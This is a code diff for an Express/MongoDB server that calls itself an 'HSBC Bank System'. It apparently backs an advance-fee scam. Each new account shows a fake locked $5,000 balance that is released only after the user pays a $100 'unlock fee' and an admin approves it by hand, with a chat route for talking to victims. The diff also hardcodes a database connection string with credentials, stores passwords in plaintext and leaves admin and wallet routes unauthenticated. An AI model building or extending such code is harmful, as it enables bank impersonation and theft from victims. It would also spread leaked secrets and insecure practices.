@@ -1,73 +1,71 @@
 const express = require('express');
-const { v4: uuidv4 } = require('uuid');
+const mongoose = require('mongoose'); // Cloud Database Driver
 const path = require('path');
-const fs = require('fs'); // Added for permanent storage
 const app = express();
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// --- PERSISTENT DATABASE SETUP ---
-const DB_FILE = './database.json';
+// --- CLOUD DATABASE CONNECTION ---
+const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://hsbc:08068611551@cluster0.zsj4kdb.mongodb.net/test?retryWrites=true&w=majority";
 
-// Function to read data from the file
-function readDatabase() {
-    try {
-        if (!fs.existsSync(DB_FILE)) {
-            const initialData = { users: {}, messages: {} };
-            fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
-            return initialData;
-        }
-        const data = fs.readFileSync(DB_FILE, 'utf8');
-        return JSON.parse(data);
-    } catch (err) {
-        console.error("Error reading database:", err);
-        return { users: {}, messages: {} };
-    }
-}
+mongoose.connect(MONGO_URI)
+    .then(() => console.log("✅ Connected to Secure Bank Vault (MongoDB)"))
+    .catch(err => console.error("❌ MongoDB Connection Error:", err));
 
-// Function to save data to the file
-function saveDatabase(data) {
-    try {
-        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
-    } catch (err) {
-        console.error("Error saving database:", err);
-    }
-}
+// --- DATA MODELS (The Vault Folders) ---
+const userSchema = new mongoose.Schema({
+    username: { type: String, unique: true, required: true },
+    password: { type: String, required: true },
+    name: String,
+    walletStatus: { type: String, default: "LOCKED" },
+    pendingBalance: { type: Number, default: 5000.00 },
+    availableBalance: { type: Number, default: 0.00 },
+    unlockFee: { type: Number, default: 100.00 },
+    notifiedAdmin: { type: Boolean, default: false }
+});
 
-// Initial load
-let db = readDatabase();
-let users = db.users; 
-let messages = db.messages;
+const chatSchema = new mongoose.Schema({
+    username: String,
+    sender: String,
+    text: String,
+    timestamp: String
+});
+
+const User = mongoose.model('User', userSchema);
+const Chat = mongoose.model('Chat', chatSchema);
 
 // --- AUTHENTICATION ROUTES ---
 
-app.post('/api/register', (req, res) => {
+app.post('/api/register', async (req, res) => {
     const { username, password } = req.body;
     if (!username || !password) return res.status(400).json({ success: false, error: "Fill all fields" });
     
-    // Refresh local cache
-    db = readDatabase();
-    if (db.users[username]) return res.status(400).json({ success: false, error: "User already exists" });
+    try {
+        const existingUser = await User.findOne({ username });
+        if (existingUser) return res.status(400).json({ success: false, error: "User already exists" });
 
-    db.users[username] = {
-        password: password,
-        name: username,
-        walletStatus: "LOCKED", // Initial state
-        pendingBalance: 5000.00,
-        availableBalance: 0.00,
-        unlockFee: 100.00,
-        notifiedAdmin: false
-    };
+        const newUser = new User({
+            username: username,
+            password: password,
+            name: username,
+            walletStatus: "LOCKED",
+            pendingBalance: 5000.00,
+            availableBalance: 0.00,
+            unlockFee: 100.00,
+            notifiedAdmin: false
+        });
 
-    saveDatabase(db);
-    console.log(`[REGISTRATION]: New user '${username}' created and saved to database.`);
-    res.json({ success: true });
+        await newUser.save();
+        console.log(`[REGISTRATION]: New user '${username}' created automatically in Cloud Vault.`);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ success: false, error: "Server Error" });
+    }
 });
 
-app.post('/api/login', (req, res) => {
+app.post('/api/login', async (req, res) => {
     const { username, password } = req.body;
-    db = readDatabase();
 
     // --- MASTER ADMIN ACCOUNT CHECK ---
     const MASTER_ADMIN_USER = "admin"; 
@@ -82,74 +80,86 @@ app.post('/api/login', (req, res) => {
     }
 
     // --- REGULAR USER CHECK ---
-    const user = db.users[username];
-    if (user && user.password === password) {
-        res.json({ 
-            success: true, 
-            username: username, 
-            isAdmin: false, 
-            redirect: "/index.html" 
-        });
-    } else {
-        res.status(401).json({ success: false, error: "Invalid credentials" });
+    try {
+        const user = await User.findOne({ username });
+        if (user && user.password === password) {
+            res.json({ 
+                success: true, 
+                username: username, 
+                isAdmin: false, 
+                redirect: "/index.html" 
+            });
+        } else {
+            res.status(401).json({ success: false, error: "Invalid credentials" });
+        }
+    } catch (err) {
+        res.status(500).json({ success: false, error: "Server Error" });
     }
 });
 
 // --- BANKING ROUTES ---
 
-app.get('/wallet/:id', (req, res) => {
-    db = readDatabase();
-    const user = db.users[req.params.id];
-    if (!user) return res.status(404).json({ error: "User not found" });
-    res.json(user);
+app.get('/wallet/:id', async (req, res) => {
+    try {
+        const user = await User.findOne({ username: req.params.id });
+        if (!user) return res.status(404).json({ error: "User not found" });
+        res.json(user);
+    } catch (err) {
+        res.status(500).json({ error: "Server Error" });
+    }
 });
 
-// USER ACTION: Notify Admin they have paid
-app.post('/wallet/:id/request-unlock', (req, res) => {
-    db = readDatabase();
-    const user = db.users[req.params.id];
-    if (!user) return res.status(404).json({ error: "User not found" });
+app.post('/wallet/:id/request-unlock', async (req, res) => {
+    try {
+        const user = await User.findOne({ username: req.params.id });
+        if (!user) return res.status(404).json({ error: "User not found" });
 
-    user.walletStatus = "PENDING_APPROVAL"; // Change state
-    user.notifiedAdmin = true;
-    
-    saveDatabase(db);
+        user.walletStatus = "PENDING_APPROVAL";
+        user.notifiedAdmin = true;
+        await user.save();
 
-    console.log(`\n************************************************`);
-    console.log(`ALERT: User '${req.params.id}' claims to have paid!`);
-    console.log(`Verify payment and approve at: http://localhost:3000/admin/approve/${req.params.id}`);
-    console.log(`************************************************\n`);
+        console.log(`\n************************************************`);
+        console.log(`ALERT: User '${req.params.id}' claims to have paid!`);
+        console.log(`Verify payment and approve at: https://hsbc-lcgy.onrender.com/admin/approve/${req.params.id}`);
+        console.log(`************************************************\n`);
 
-    res.json({ 
-        success: true, 
-        message: "Payment notification sent. Your funds will be released after admin verification." 
-    });
+        res.json({ 
+            success: true, 
+            message: "Payment notification sent. Your funds will be released after admin verification." 
+        });
+    } catch (err) {
+        res.status(500).json({ error: "Server Error" });
+    }
 });
 
 // --- LIVE CHAT ROUTES ---
 
-app.post('/api/chat/send', (req, res) => {
+app.post('/api/chat/send', async (req, res) => {
     const { username, text, isAdmin } = req.body;
     if (!username || !text) return res.status(400).json({ error: "Missing data" });
 
-    db = readDatabase();
-    if (!db.messages[username]) db.messages[username] = [];
-    
-    db.messages[username].push({
-        sender: isAdmin ? 'admin' : 'user',
-        text: text,
-        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
-    });
-
-    saveDatabase(db);
-    console.log(`[CHAT] ${isAdmin ? 'ADMIN' : username}: ${text}`);
-    res.json({ success: true });
+    try {
+        const newChat = new Chat({
+            username: username,
+            sender: isAdmin ? 'admin' : 'user',
+            text: text,
+            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+        });
+        await newChat.save();
+        console.log(`[CHAT] ${isAdmin ? 'ADMIN' : username}: ${text}`);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: "Server Error" });
+    }
 });
 
-app.get('/api/chat/history/:username', (req, res) => {
-    db = readDatabase();
-    const history = db.messages[req.params.username] || [];
-    res.json(history);
+app.get('/api/chat/history/:username', async (req, res) => {
+    try {
+        const history = await Chat.find({ username: req.params.username });
+        res.json(history);
+    } catch (err) {
+        res.status(500).json({ error: "Server Error" });
+    }
 });
 
 // --- ADMIN ROUTES ---
@@ -165,39 +175,41 @@ app.post('/api/admin/login', (req, res) => {
     }
 });
 
-app.get('/api/admin/users/all', (req, res) => {
-    db = readDatabase();
-    const allUsers = Object.keys(db.users).map(username => ({
-        username: username,
-        ...db.users[username]
-    }));
-    res.json(allUsers);
+app.get('/api/admin/users/all', async (req, res) => {
+    try {
+        const allUsers = await User.find({});
+        res.json(allUsers);
+    } catch (err) {
+        res.status(500).json({ error: "Server Error" });
+    }
 });
 
-app.get('/admin/approve/:username', (req, res) => {
-    db = readDatabase();
-    const user = db.users[req.params.username];
-    if (!user) return res.status(404).send("User not found");
+app.get('/admin/approve/:username', async (req, res) => {
+    try {
+        const user = await User.findOne({ username: req.params.username });
+        if (!user) return res.status(404).send("User not found");
 
-    user.walletStatus = "ACTIVE";
-    user.availableBalance = user.pendingBalance;
-    user.pendingBalance = 0;
-    
-    saveDatabase(db);
+        user.walletStatus = "ACTIVE";
+        user.availableBalance = user.pendingBalance;
+        user.pendingBalance = 0;
+        await user.save();
 
-    console.log(`[ADMIN]: Funds released for ${req.params.username}`);
-    res.send(`<h1>Approval Success</h1><p>User <b>${req.params.username}</b> now has access to their $5,000.00.</p>`);
+        console.log(`[ADMIN]: Funds released for ${req.params.username}`);
+        res.send(`<h1>Approval Success</h1><p>User <b>${req.params.username}</b> now has access to their funds.</p>`);
+    } catch (err) {
+        res.status(500).send("Server Error");
+    }
 });
 
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`-------------------------------------------`);
-    console.log(`HSBC Bank System Running (Persistence Enabled)`);
-    console.log(`Admin Data: http://localhost:${PORT}/admin.html`);
-    console.log(`Database saved to: ${DB_FILE}`);
+    console.log(`HSBC Bank System Running (Cloud Persistence)`);
+    console.log(`Admin Data: https://hsbc-lcgy.onrender.com/admin.html`);
+    console.log(`Cloud Vault Status: Connecting...`);
     console.log(`-------------------------------------------`);
 });
